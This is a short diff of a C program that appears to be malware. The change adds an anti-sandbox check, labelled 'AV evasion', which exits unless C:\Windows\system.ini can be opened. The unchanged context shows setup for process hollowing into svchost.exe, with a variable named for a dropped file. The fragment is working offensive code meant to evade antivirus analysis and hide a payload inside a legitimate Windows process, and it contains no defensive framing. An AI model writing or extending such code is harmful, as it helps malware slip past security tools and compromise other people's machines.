@@ -7,6 +7,15 @@
 int main() {	
 	FILE *currentDropfile;
 	
+	// AV evasion: Anti-sandbox via fopen
+	// If program is sandboxed, fp should be null and program exits, sandboxing stops.
+	// If file can be opened, continue.
+	FILE *fp = fopen("C:\\Windows\\system.ini", "rb");
+	if (fp == NULL) {
+		return 0;
+	}
+	fclose(fp);	
+	
 	// Designate hollowing target and desired current directory
 	char target[] = "C:\\Windows\\System32\\svchost.exe";
 	char desiredCurrentDirectory[] = "C:\\Windows\\System32";
